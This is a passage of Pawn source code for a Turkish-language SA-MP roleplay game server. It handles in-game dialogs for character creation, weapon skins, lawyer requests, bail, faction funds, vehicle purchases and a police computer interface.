			    ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
			}
		}
		else ShowPlayerDialog(playerid, 447, DIALOG_STYLE_LIST, "Göz Rengi Seçimi", "Siyah\nKahverengi\nMavi\nYeþil\nDiðer", "Seçim", "");
		return 1;
	}
	if(dialogid == 448) {
		if(response) {
			Karakter[playerid][sacrenk] = listitem+1;
			Bilgi(playerid, "Karakterinizin saç rengini belirlediniz ve karakterinizi yarattýnýz.");
			Ipucu(playerid, "/yardim komutuyla temel komutlara eriþebilirsiniz.");
			Ipucu(playerid, "VirtualWorld'ünüz bozuksa sýfýrlamak için /vwsifirla komutunu kullanabilirsiniz.");
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInteriorEx(playerid, 0);
			TogglePlayerControllable(playerid, 1);
			SetCameraBehindPlayer(playerid);
			new randomspawnet = random(35);
			switch(randomspawnet)
			{
				case 0: SetPlayerPos(playerid, 1750.7838,-1862.1844,13.5766);
				case 1: SetPlayerPos(playerid, 1753.5369,-1862.2029,13.5766);
				case 2: SetPlayerPos(playerid, 1758.3049,-1862.2352,13.5765);
				case 3: SetPlayerPos(playerid, 1762.6011,-1862.2646,13.5765);
				case 4: SetPlayerPos(playerid, 1776.4479,-1862.3601,13.5764);
				case 5: SetPlayerPos(playerid, 1780.3695,-1862.3873,13.5764);
				case 6: SetPlayerPos(playerid, 1786.7704,-1862.4305,13.5763);
				case 7: SetPlayerPos(playerid, 1792.1700,-1862.4679,13.5763);
				case 8: SetPlayerPos(playerid, 1798.3849,-1862.5099,13.5762);
				case 9: SetPlayerPos(playerid, 1803.6554,-1862.5468,13.5762);
				case 10: SetPlayerPos(playerid, 1810.9467,-1862.5962,13.5839);
				case 11: SetPlayerPos(playerid, 1813.6903,-1865.6976,13.5704);
				case 12: SetPlayerPos(playerid, 1814.0808,-1869.5260,13.5704);
				case 13: SetPlayerPos(playerid, 1814.2225,-1873.6034,13.5704);
				case 14: SetPlayerPos(playerid, 1813.9780,-1878.5764,13.5781);
				case 15: SetPlayerPos(playerid, 1812.5847,-1882.8561,13.5781);
				case 16: SetPlayerPos(playerid, 1764.0953,-1886.7959,13.5546);
				case 17: SetPlayerPos(playerid, 1762.7538,-1889.6582,13.5549);
				case 18: SetPlayerPos(playerid, 1759.7238,-1892.2463,13.5556);
				case 19: SetPlayerPos(playerid, 1759.5277,-1896.8772,13.5617);
				case 20: SetPlayerPos(playerid, 1762.2241,-1901.7577,13.5648);
				case 21: SetPlayerPos(playerid, 1766.4988,-1903.9536,13.5669);
				case 22: SetPlayerPos(playerid, 1770.2246,-1904.9647,13.5572);
				case 23: SetPlayerPos(playerid, 1829.8313,-1876.0037,13.5655);
				case 24: SetPlayerPos(playerid, 1829.5717,-1879.8796,13.4634);
				case 25: SetPlayerPos(playerid, 1829.0996,-1885.5889,13.4759);
				case 26: SetPlayerPos(playerid, 1829.6337,-1859.0194,13.5781);
				case 27: SetPlayerPos(playerid, 1829.6600,-1856.5359,13.5781);
				case 28: SetPlayerPos(playerid, 1805.6013,-1809.5454,13.5491);
				case 29: SetPlayerPos(playerid, 1801.2000,-1807.8989,13.5388);
				case 30: SetPlayerPos(playerid, 1794.6823,-1808.7676,13.5350);
				case 31: SetPlayerPos(playerid, 1788.2733,-1805.3058,13.5314);
				case 32: SetPlayerPos(playerid, 1781.1945,-1806.7764,13.5234);
				case 33: SetPlayerPos(playerid, 1776.0731,-1807.8912,13.5337);
				case 34: SetPlayerPos(playerid, 1806.4121,-1801.5327,13.5446);
			}
		}
		else ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
		return 1;
	}
	if(dialogid == 449) {
		if(response) {
			/*new _model[sizeof(GunSkins[])-1];
			for(new i=1;i<sizeof(GunSkins[]);i++) {
				if(GunSkins[listitem][i] != 0)
					_model[i-1] = GunSkins[listitem][i];
			}
			SetPVarInt(playerid, "SilahSkinSec", GunSkins[listitem][0]);
			new size = Delete(_model, 0);
			ShowModelSelectionMenuEx(playerid, _model, size, "SKIN SEC", MENU_SKIN_SEC2, .mZoom=2.25);*/
			new xmstring[1024];
            for(new i=1;i<sizeof(GunSkins[]);i++) {
                if(GunSkins[listitem][i] != 0)
                    format(xmstring, sizeof(xmstring), "%s{FA4A4E}%s\n", xmstring, GetGunSkinName(GunSkins[listitem][i]));
			}
			SetPVarInt(playerid, "SilahSkinSec", GunSkins[listitem][0]);
			ShowPlayerDialog(playerid, 450, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Skin Seç", xmstring, "Seç", "Ýptal");
		}
		return 1;
	}
	if(dialogid == 450) {
		if(response) {
		    new __id;
		    for(new i=0;i<sizeof(GunSkins);i++) {
                if(GunSkins[i][0] == GetPVarInt(playerid, "SilahSkinSec")) {
					__id = i;
					break;
				}
			}
			new modelid = GunSkins[__id][listitem+1];
			if(Karakter[playerid][SilahSkin][GetPVarInt(playerid, "SilahSkinSec")] == modelid) return Hata(playerid, "Zaten bu skini kullanýyorsunuz.");
			if(modelid < 0 && !SQLCheckSkin(Karakter[playerid][sqlid], GetGunSQLName(modelid))) return Hata(playerid, "Bu skine sahip deðilsiniz.");
			new xmstring[256];
			format(xmstring, sizeof(xmstring), "%s isimli silahýnýzýn skinini %s olarak deðiþtirdiniz.", GetGunName(GetPVarInt(playerid, "SilahSkinSec")), GetGunSkinName(modelid));
			Bilgi(playerid, xmstring);
			Karakter[playerid][SilahSkin][GetPVarInt(playerid, "SilahSkinSec")] = modelid;
		    mysql_format(1,xmstring, sizeof(xmstring), "UPDATE `karakterler` SET `skin%d` = '%d' WHERE `id` = '%d'",
			GetPVarInt(playerid, "SilahSkinSec"),
			modelid,
			Karakter[playerid][sqlid]);
			mysql_tquery(1,xmstring);
		}
		return 1;
	}
	if(dialogid == 451) {
		if(response) {
		    if(Karakter[playerid][ozellik] == 0) return Hata(playerid, "Özellik geliþtirmek için özellik geliþtirme puanýna sahip olmanýz gerekiyor.");
		    switch(listitem) {
				case 0: {
				    if(KarakterOzellik[playerid][Liderlik] == 20) return Hata(playerid, "Maksimum seviyeye ulaþmýþsýnýz.");
				    KarakterOzellik[playerid][Liderlik]++;
				    Karakter[playerid][ozellik]--;
				    Bilgi(playerid, "Liderlik özelliðinizi geliþtirdiniz.");
				}
				case 1: {
					if(KarakterOzellik[playerid][Guc] == 20) return Hata(playerid, "Maksimum seviyeye ulaþmýþsýnýz.");
					KarakterOzellik[playerid][Guc]++;
					Karakter[playerid][ozellik]--;
				    Bilgi(playerid, "Güç özelliðinizi geliþtirdiniz.");
				}
				case 2: {
				    if(KarakterOzellik[playerid][Pazarlik] == 10) return Hata(playerid, "Maksimum seviyeye ulaþmýþsýnýz.");
					KarakterOzellik[playerid][Pazarlik]++;
					Karakter[playerid][ozellik]--;
				    Bilgi(playerid, "Pazarlýk özelliðinizi geliþtirdiniz.");
				}
				case 3: {
				    if(KarakterOzellik[playerid][Ustalik] == 10) return Hata(playerid, "Maksimum seviyeye ulaþmýþsýnýz.");
					KarakterOzellik[playerid][Ustalik]++;
					Karakter[playerid][ozellik]--;
				    Bilgi(playerid, "Ustalýk özelliðinizi geliþtirdiniz.");
				}
			}
		}
		return 1;
	}
	if(dialogid == 452)
	{
	    if(response)
	    {
	        new _osay=0, _mstring[128];
	        foreach(new i : Player)
	        {
	            if(talep[i] == 1)
	            {
		            _osay++;
		            if(_osay == listitem+1)
		            {
				        format(_mstring, sizeof(_mstring), ""C2"%s\n"C2"( "C1"%s "C2")\n"C2"( TelNo: %d "C2")",OyuncuAdiniBul(i),talepMesaj[i],Karakter[i][telno]);
				        SetPVarInt(playerid, "TalepCevapla", i);
				        break;
					}
				}
			}
	        ShowPlayerDialog(playerid, 453, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Talepler", _mstring, "Ýþlem Yap", "Ýþlem Kapat");
	    }
	    return 1;
	}
	if(dialogid == 453)
	{
		if(response)
		{
			new i = GetPVarInt(playerid, "TalepCevapla");
		    if(aTIslemde[i]) return Hata(playerid, "Bu talep baþka bir avukat tarafýndan iþlem görüyor.");
		    new _mstring[256];
      		format(_mstring, sizeof(_mstring), ""C2"%s\n"C2"( "C1"%s "C2")\n"C2"( TelNo: %d "C2")",OyuncuAdiniBul(i),talepMesaj[i],Karakter[i][telno]);
		    ShowPlayerDialog(playerid, 454, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Talepler", _mstring, "Kabul Et", "Reddet");
		    aTIslemde[i] = true;
		}
	    return 1;
	}
	if(dialogid == 454)
	{
	    if(response)
	    {
	        new pid = GetPVarInt(playerid, "TalepCevapla");
            SendClientMessageEx(playerid, -1, "{ffd700}[TALEP] "C1"%s adlý kiþinin talebini kabul ettiniz.",OyuncuAdiniBul(pid));
		    SendClientMessageEx(pid, -1, "{ffd700}[TALEP] "C1"%s adlý avukat talebinizi kabul etti.", OyuncuAdiniBul(playerid));
		    talep[pid] = 0;
			talepMesaj[pid] = "";
		    DeletePVar(playerid, "TalepCevapla");
		    aTIslemde[pid] = false;
	    }
	    else
	    {
	        new pid = GetPVarInt(playerid, "TalepCevapla");
	        SendClientMessageEx(playerid, -1, "{ffd700}[TALEP] "C1"%s adlý kiþinin talebini reddetiniz.",OyuncuAdiniBul(pid));
	        SendClientMessageEx(playerid, -1, "{ffd700}[TALEP] "C1"%s adlý avukat talebinizi reddetiniz.",OyuncuAdiniBul(playerid));
	        talep[pid] = 0;
			talepMesaj[pid] = "";
	        DeletePVar(playerid, "TalepCevapla");
	        aTIslemde[pid] = false;
	    }
	    return 1;
	}
	if(dialogid == 455) {
		if(response) {
	        talep[playerid] = 1;
	        format(talepMesaj[playerid], 128, "%s", inputtext);
	        new _mstring[128];
			format(_mstring, sizeof(_mstring), "{ffd700}[AVUKAT] "C1"%s isimli oyuncu avukat talebinde bulunmuþtur. ('/avukat talepler')", OyuncuAdiniBul(playerid));
			foreach(new i : Player) {
				if(Karakter[i][avukat] > 0) SendClientMessage(i, -1, _mstring);
			}
		}
		return 1;
	}
	if(dialogid == 456) {
		if(response) {
		    new userID = GetPlayerIdFromName(inputtext);
		    if(!IsPlayerConnected(userID)) return Hata(playerid, "Hatalý oyuncu ismi girdiniz.");
		    if(Karakter[userID][kodes] <= 1) return Hata(playerid, "Oyuncu hapiste deðil.");
			SetPVarInt(playerid, "KefaletID", userID);
			SetPVarInt(playerid, "KefaletUcret", Karakter[userID][kodes]*100);
			new _mstring[128];
			format(_mstring, sizeof(_mstring), ""C1"%s isimli kiþinin kefalet ücreti %d"DOLAR"$"C1"'dýr.\nÖdemek istiyor musunuz ?", OyuncuAdiniBul(userID),  Karakter[userID][kodes]*100);
			ShowPlayerDialog(playerid, 457, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Kefalet", _mstring, "Kefalet Öde", "Ýptal");
		}
		return 1;
	}
	if(dialogid == 457) {
		if(response) {
		    new userID = GetPVarInt(playerid, "KefaletID");
		    new kefaletUcret = GetPVarInt(playerid, "KefaletUcret");
		    if(GetPlayerCash(playerid) < kefaletUcret) return Hata(playerid, "Yeterli miktarda paranýz bulunmamaktadýr.");
		    GivePlayerCash(playerid, -kefaletUcret);
			KarakterKaydet(playerid);
			new _mstring[128];
			format(_mstring, sizeof(_mstring), "%s isimli kiþinin kefaletini ödediniz.", OyuncuAdiniBul(userID));
			Bilgi(playerid, _mstring);
			format(_mstring, sizeof(_mstring), "%s isimli kiþi sizin kefaletinizi ödedi. ('/hapiscik')", OyuncuAdiniBul(playerid));
			Bilgi(userID, _mstring);
			Karakter[userID][kodes] = 1;
		}
		return 1;
	}
	if(dialogid == 458)
    {
        if(response)
        {
            new string[128];
			new vehID = GetPlayerVehicleID(playerid);
			if(!IsPlayerInAnyVehicle(playerid))
			{
				DisablePlayerCheckpoint(playerid);
				KamCheckpoint[playerid] = 0;
				KamGorevde[playerid] = 0;
				Bilgi(playerid, "Araçtan indiðiniz için hafriyat iptal edildi.");
				return 1;
			}
			format(string, sizeof(string), "~w~MOTOR ~g~CALISTIRILIYOR...");
			GameTextForPlayer(playerid, string, 2500, 4);
			MotoruAciliyor[vehID] = true;
			SetTimerEx("MotoruAc", 3000, false, "ii", vehID, playerid);
			SetPlayerCheckpoint(playerid, 2227.3994,-2635.8030,13.1024, 5.0);
			KamCheckpoint[playerid] = 2;
			KamGorevde[playerid] = 1;
			if(Arac[vehID][atip] == 3) Bilgi(playerid, "Kamyonu yüklemelisiniz.");
			else Bilgi(playerid, "Aracý yüklemelisiniz.");
		}
		else RemovePlayerFromVehicle(playerid);
		return 1;
	}
	if(dialogid == 459)
	{
	    if(response) {
			new string[256];
			switch(listitem) {
				case 0: {
				    format(string, sizeof(string), ""C1"Birlik kasasýndaki para: %d"DOLAR"$\n\n"C1"Bir kasasýna ne kadar para yatýrmak istiyorsunuz?", Birlik[Karakter[playerid][birlik]][kasa]);
				    ShowPlayerDialog(playerid, 460, DIALOG_STYLE_INPUT, BirlikBaslik(playerid), string, "Para Yatýr", "Ýptal");
				}
				case 1: {
					if(BirlikYetkili(playerid) || Karakter[playerid][sqlid] == Birlik[Karakter[playerid][birlik]][blider]) {
				    	format(string, sizeof(string), ""C1"Birlik kasasýndaki para: %d"DOLAR"$\n\n"C1"Bir kasasýndan ne kadar para çekmek istiyorsunuz?", Birlik[Karakter[playerid][birlik]][kasa]);
				    	ShowPlayerDialog(playerid, 461, DIALOG_STYLE_INPUT, BirlikBaslik(playerid), string, "Para Çek", "Ýptal");
					} else	Mesaj(playerid, HATA_MESAJ, "Birlik kasasýndan para çekebilmeniz için birlik lideri veya yetkilisi olmanýz gerekmektedir.");
				}
			}
		}
	    return 1;
	}
	if(dialogid == 460)
	{
	    if(response) {
			new ucret = strval(inputtext);
			if(ucret <= 0 || ucret > 1000000) return Hata(playerid, "Hatalý miktarda para girdiniz.");
			if(GetPlayerCash(playerid) < ucret) return Hata(playerid, "Üzerinizde bu kadar para bulunmamaktadýr.");
			new string[128];
			format(string, sizeof(string), "Birlik kasasýna %d$ para yatýrdýnýz.", ucret);
			Bilgi(playerid, string);
			Birlik[Karakter[playerid][birlik]][kasa] += ucret;
			GivePlayerCash(playerid, -ucret);
			BirlikKaydet(Karakter[playerid][birlik]);
	    }
	    return 1;
	}
	if(dialogid == 461)
	{
	    if(response) {
			new ucret = strval(inputtext);
			if(ucret <= 0 || ucret > 1000000) return Hata(playerid, "Hatalý miktarda para girdiniz.");
			if(Birlik[Karakter[playerid][birlik]][kasa] < ucret) return Hata(playerid, "Kasada bu kadar para bulunmamaktadýr.");
			new string[128];
			format(string, sizeof(string), "Birlik kasasýndan %d$ para çektiniz.", ucret);
			Bilgi(playerid, string);
			Birlik[Karakter[playerid][birlik]][kasa] -= ucret;
			GivePlayerCash(playerid, ucret);
			BirlikKaydet(Karakter[playerid][birlik]);
	    }
	    return 1;
	}
	if(dialogid == 462)
	{
	    if(response) {
	        TimerGirisKontrol[playerid] = SetTimerEx("GirisKontrol", 60000, false, "i", playerid);
			ShowPlayerDialog(playerid, 1, DIALOG_STYLE_PASSWORD, ""C7"EIGHTBORN - "C8"Giriþ", "{FFFFFF}Hoþgeldiniz!\nKarakteriniz sistem tarafýndan veritabanýnda kayýtlý olarak algýlandý.\n60 saniye içerisinde giriþ yapmazsanýz otomatik olarak atýlacaksýnýz.\nGiriþ yapabilmek için lütfen þifrenizi giriniz.", "Giriþ", "Çýkýþ");
			if(listitem != 0) Hata(playerid, "Þu an yeni karakter yaratamazsýnýz.");
		}
	    return 1;
	}
	if(dialogid == 463)
	{
		if(response)
		{
			switch(listitem)
			{
		    	case 0: AracRenk1Exx_1(playerid);//RENK1
			    case 1: AracRenk2Exx_1(playerid);//RENK2
				case 2: HavaAracSatinalMenu(playerid);//FIYAT
				case 3://ONAYLA
			    {
			    	if(Karakter[playerid][para] >= AldigiAracFiyati[playerid])
			        {
			            new hurdaArac = 0, new_vehicle_sql_id;
						new _query[1024];
						for(new i; i < MAX_VEHICLES; i++) {
							if(Arac[i][ahurda] == 1) {
							    new_vehicle_sql_id = i;
								hurdaArac = i;
								LinkVehicleToInterior(i, 0);
								SetVehicleVirtualWorld(i, 0);
								AracModifiyeleriSil(i);
								DestroyVehicle(i);
								break;
							}
						}
						if(!hurdaArac) {
							format(_query, sizeof(_query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
				            new Cache:cache = mysql_query(_query,true);
				            new_vehicle_sql_id = cache_insert_id();
							cache_delete(cache);
						}
						new vehicleid = CreateVehicle(SectigiArac[playerid], 1964.6136, -2324.6924, 14.9220, 178.3509, SectigiAracRenk1[playerid], SectigiAracRenk2[playerid], -1);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = SectigiArac[playerid];
						    Arac[vehicleid][arenk1] = SectigiAracRenk1[playerid];
						    Arac[vehicleid][arenk2] = SectigiAracRenk2[playerid];
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 1964.6136;
						    Arac[vehicleid][aposy] = -2324.6924;
						    Arac[vehicleid][aposz] = 14.9220;
						    Arac[vehicleid][avworld] = 0;
						    Arac[vehicleid][ainterior] = 0;
						    Arac[vehicleid][afiyat] = AldigiAracFiyati[playerid];
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = SectigiYakit[playerid];
							Arac[vehicleid][ahizsabit] = SectigiHizSabit[playerid];
							Arac[vehicleid][vergi] = 0;
							Arac[vehicleid][ahurda] = 0;
							Arac[vehicleid][akilit] = 0;
							Arac[vehicleid][akm] = 0;
							Arac[vehicleid][ametre] = 0;
							Arac[vehicleid][aisyeri] = 0;
							Arac[vehicleid][agelir] = 0;
							Aractamiri(vehicleid);
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -AldigiAracFiyati[playerid]);
							Bilgi(playerid, "Araç teslimatý baþarýyla gerçekleþti.");
							new araclogla[110];
							format(araclogla, sizeof(araclogla), "[HAVA GALERÝ - /a satinal] Galeriden %d idli araci satin aldi. model: %d fiyat: %d aowner: %d", Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat], Arac[vehicleid][aowner]);
							Log(playerid, araclogla);
						}
					}
					else return Hata(playerid, "Üzerinizde yeterli miktarda para bulunmamaktadýr.");
			    }
			}
		}
		return 1;
	}
	if(dialogid == 464)
	{
		if(response)
		{
			switch(listitem)
			{
		    	case 0: AracRenk1Exx_2(playerid);//RENK1
			    case 1: AracRenk2Exx_2(playerid);//RENK2
				case 2: DenizAracSatinalMenu(playerid);//FIYAT
				case 3://ONAYLA
			    {
			    	if(Karakter[playerid][para] >= AldigiAracFiyati[playerid])
			        {
			            new hurdaArac = 0, new_vehicle_sql_id;
						new _query[1024];
						for(new i; i < MAX_VEHICLES; i++) {
							if(Arac[i][ahurda] == 1) {
							    new_vehicle_sql_id = i;
								hurdaArac = i;
								LinkVehicleToInterior(i, 0);
								SetVehicleVirtualWorld(i, 0);
								AracModifiyeleriSil(i);
								DestroyVehicle(i);
								break;
							}
						}
						if(!hurdaArac) {
							format(_query, sizeof(_query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
				            new Cache:cache = mysql_query(_query,true);
				            new_vehicle_sql_id = cache_insert_id();
							cache_delete(cache);
						}
						new vehicleid = CreateVehicle(SectigiArac[playerid], 903.2685, -2116.6506, 0.1034, 95.2010, SectigiAracRenk1[playerid], SectigiAracRenk2[playerid], -1);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = SectigiArac[playerid];
						    Arac[vehicleid][arenk1] = SectigiAracRenk1[playerid];
						    Arac[vehicleid][arenk2] = SectigiAracRenk2[playerid];
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 903.2685;
						    Arac[vehicleid][aposy] = -2116.6506;
						    Arac[vehicleid][aposz] = 0.1034;
						    Arac[vehicleid][avworld] = 0;
						    Arac[vehicleid][ainterior] = 0;
						    Arac[vehicleid][afiyat] = AldigiAracFiyati[playerid];
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = SectigiYakit[playerid];
							Arac[vehicleid][ahizsabit] = SectigiHizSabit[playerid];
							Arac[vehicleid][vergi] = 0;
							Arac[vehicleid][ahurda] = 0;
							Arac[vehicleid][akilit] = 0;
							Arac[vehicleid][akm] = 0;
							Arac[vehicleid][ametre] = 0;
							Arac[vehicleid][aisyeri] = 0;
							Arac[vehicleid][agelir] = 0;
							Aractamiri(vehicleid);
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -AldigiAracFiyati[playerid]);
							Bilgi(playerid, "Araç teslimatý baþarýyla gerçekleþti.");
							new araclogla[110];
							format(araclogla, sizeof(araclogla), "[BOT GALERÝ - /a satinal] Galeriden %d idli araci satin aldi. model: %d fiyat: %d aowner: %d", Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat], Arac[vehicleid][aowner]);
							Log(playerid, araclogla);
						}
					}
					else return Hata(playerid, "Üzerinizde yeterli miktarda para bulunmamaktadýr.");
			    }
			}
		}
		return 1;
	}
	// dialog sonu

	return 1;
}
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(Debug) printf("OnPlayerClickPlayer(%d, %d, %d)",playerid, clickedplayerid, source);
	return 1;
}

public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
    if(Debug) printf("OnPlayerClickPlayerTextDraw(%d, -)",playerid);
	//for(new z; z < 33; z++) { if(rty[playerid][z] == playertextid) { PlayerTextDrawHide(playerid, playertextid); printf("%d", z); } }
    if(playertextid == PDMDC[playerid][16])
    {
        for(new i=0;i<55;i++)
		{
		    PlayerTextDrawHide(playerid, PDMDC[playerid][i]);
		}
		CancelSelectTextDraw(playerid);
		SetPVarInt(playerid, "MDC", 0);
		Bilgi(playerid, "Taþýnabilir dijital bilgisayar kapatýldý.");
    }
    if(playertextid == PDMDC[playerid][18])
    {
        SetPVarInt(playerid, "MDCTip", 1);
		ShowPlayerDialog(playerid, 394, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"LSPD - MDC", ""C1"Sorgulatmak istediðiniz oyuncu ismini girin:", "Sorgulat", "Ýptal");
        //oyuncu
    }
    if(playertextid == PDMDC[playerid][19])
    {
        SetPVarInt(playerid, "MDCTip", 2);
		ShowPlayerDialog(playerid, 394, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"LSPD - MDC", ""C1"Sorgulatmak istediðiniz ev idsini girin:", "Sorgulat", "Ýptal");
        //ev
    }
    if(playertextid == PDMDC[playerid][21])
    {
        SetPVarInt(playerid, "MDCTip", 3);
		ShowPlayerDialog(playerid, 394, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"LSPD - MDC", ""C1"Sorgulatmak istediðiniz iþyeri idsini girin:", "Sorgulat", "Ýptal");
        //iþyeri
    }
    if(playertextid == PDMDC[playerid][22])
    {
        SetPVarInt(playerid, "MDCTip", 4);
		ShowPlayerDialog(playerid, 394, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"LSPD - MDC", ""C1"Sorgulatmak istediðiniz araç plakasýný girin:", "Sorgulat", "Ýptal");
        //araç
    }
    if(playertextid == PDMDC[playerid][50])
    {
        if(Karakter[playerid][rutbe] >= 11 || !Karakter[playerid][isbasi]) return 1;
		new Buldum=0,_string[MAX_PLAYER_NAME+2],string[128];
		GetPVarString(playerid, "MDCOyuncuIsim", _string, sizeof(_string));
		new telNO = TelNoBulEx(_string);
		for(new i; i < MAX_PLAYERS; i++)
		{
		    if(Karakter[i][telno] == telNO && Karakter[i][teldurum] == 1)
		    {
		        if(Karakter[i][sonint] == 0)
		        {
		            new BolgeBulucu[MAX_ZONE_NAME], Float:pPos[3];
					GetPlayerZone(i, BolgeBulucu, MAX_ZONE_NAME);
		            SetPVarInt(playerid, "LSPDTelTakip", 1);
					GetPlayerPos(i, pPos[0],pPos[1],pPos[2]);
					SetPlayerCheckpoint(playerid,pPos[0],pPos[1],pPos[2],5.0);
				    SendClientMessage(playerid, COLOR_WHITE, ""C3"[Los Santos Polis Departmaný - Taþýnabilir Dijital Bilgisayar]");
					format(string, sizeof(string), ""C3"Telefon Numarasý : "C1"%d", telNO);
					SendClientMessage(playerid, COLOR_WHITE, string);
					format(string, sizeof(string), ""C3"Bulunduðu Bölge : "C1"%s", BolgeBulucu);
					SendClientMessage(playerid, COLOR_WHITE, string);
					SendClientMessage(playerid, COLOR_WHITE, ""C3"Telefon Durumu : "C1"Açýk");
					Buldum++;
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_WHITE, ""C3"[Los Santos Polis Departmaný - Taþýnabilir Dijital Bilgisayar]");
					format(string, sizeof(string), ""C3"Telefon Numarasý : "C1"%d", telNO);
					SendClientMessage(playerid, COLOR_WHITE, string);
					SendClientMessage(playerid, COLOR_WHITE, ""C3"Bulunduðu Bölge : "C1"Bulunamadý");
					SendClientMessage(playerid, COLOR_WHITE, ""C3"Telefon Durumu : "C1"Açýk");
					Buldum++;
					return 1;
				}
			}
			if(Karakter[i][telno] == telNO && Karakter[i][teldurum] == 0)
		    {
		        if(GetPlayerInterior(i) == 0)
		        {
					SetPVarInt(playerid, "LSPDTelTakip", 1);
					SetPlayerCheckpoint(playerid,Karakter[i][sonx],Karakter[i][sony],Karakter[i][sonz],5.0);
				    SendClientMessage(playerid, COLOR_WHITE, ""C3"[Los Santos Polis Departmaný - Taþýnabilir Dijital Bilgisayar]");
					format(string, sizeof(string), ""C3"Telefon Numarasý : "C1"%d", telNO);
					SendClientMessage(playerid, COLOR_WHITE, string);
					SendClientMessage(playerid, COLOR_WHITE, ""C3"Son Bulunduðu Bölge : "C1"GPS");
					SendClientMessage(playerid, COLOR_WHITE, ""C3"Telefon durumu : "C1"Kapalý");
					Ipucu(playerid, "GPS aktif edildi, son konum haritada iþaretlendi.");
					Buldum++;
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_WHITE, ""C3"[Los Santos Polis Departmaný - Taþýnabilir Dijital Bilgisayar]");
					format(string, sizeof(string), ""C3"Telefon Numarasý : "C1"%d", telNO);
					SendClientMessage(playerid, COLOR_WHITE, string);
					SendClientMessage(playerid, COLOR_WHITE, ""C3"Son Bulunduðu Bölge : "C1"Bulunamadý");
					SendClientMessage(playerid, COLOR_WHITE, ""C3"Telefon durumu : "C1"Kapalý");
					Buldum++;
					return 1;
				}
			}
		}
		if(Buldum == 0)
		{
		    Hata(playerid, "Hatalý bir numara girdiniz veya sonuç bulunamadý.");
			return 1;
		}
		//tel takip
    }
	if(playertextid == PDMDC[playerid][51])
    {
        new _string[MAX_PLAYER_NAME+2];
		GetPVarString(playerid, "MDCOyuncuIsim", _string, sizeof(_string));
		SicilGorunteleEx(playerid, _string);
        //sabika kaydi
    }
    if(playertextid == PDMDC[playerid][52])
    {
        Hata(playerid, "Ýnaktif.");
        //ekipkur
    }
    if(playertextid == PDMDC[playerid][53])
    {
        Hata(playerid, "Ýnaktif.");
        //kamera
    }
    if(playertextid == PDMDC[playerid][23])
    {
        if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && !Karakter[playerid][isbasi]) return 1;
		ShowPlayerDialog(playerid, 396, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"LSPD - MDC", "Aranma Kayýtlarýna Göz At\nAranma Kayýtý Ekle", "Seç", "Ýptal");
		//aranma kaydi
    }
	if(playertextid == qwe[playerid][31]) HidePlayerPhone(playerid);
	if(playertextid == rty[playerid][31]) HidePlayerPhone(playerid);
